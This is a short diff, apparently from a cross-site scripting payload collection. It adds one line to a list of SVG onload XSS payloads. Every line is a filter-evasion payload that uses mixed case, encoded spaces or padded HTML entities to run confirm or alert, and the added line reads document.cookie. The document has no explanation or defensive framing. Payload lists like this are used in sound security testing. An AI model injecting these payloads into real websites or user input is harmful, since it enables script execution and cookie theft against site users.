@@ -1,3 +1,4 @@
 "/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
 "/><svg+svg+svg\/\/On+OnLoAd+%20=confirm(1)>
 <svg on onload=(alert)(document.domain)>
+<svg onload=alert&#0000000040document.cookie)>
